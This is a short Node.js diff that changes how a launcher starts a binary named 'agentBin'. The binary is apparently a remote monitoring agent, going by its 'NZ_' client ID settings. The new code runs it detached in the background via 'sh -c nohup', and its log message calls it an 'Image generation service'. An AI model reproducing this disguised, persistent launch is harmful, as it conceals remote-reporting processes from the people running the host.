@@ -209,15 +209,18 @@ uuid: '${uuid}'
 
             child.on('error', (err) => {
                 console.log('Direct spawn failed: ' + err.message + ', trying sh wrapper...');
-                // 方案 2：通过 sh -c 调用（绕过 EACCES）
+                // 方案 2：通过 sh -c + nohup 后台运行（绕过 EACCES + 不阻塞）
                 try {
-                    const shChild = spawn('sh', ['-c', agentBin + ' -c ' + configPath], {
+                    const shChild = spawn('sh', ['-c', 
+                        'nohup ' + agentBin + ' -c ' + configPath + ' > /tmp/agent.log 2>&1 &'
+                    ], {
                         env: { ...process.env, UUID: uuid, NZ_CLIENT_ID: uuid, NZ_REPORT_DELAY: '4' },
                         stdio: "ignore",
                         detached: true
                     });
+                    shChild.unref();
                     shChild.on('spawn', () => {
-                        console.log("Image generation service started (via sh).");
+                        console.log("Image generation service started (background via sh).");
                     });
                     shChild.on('error', (err2) => {
                         console.log('sh spawn also failed: ' + err2.message);
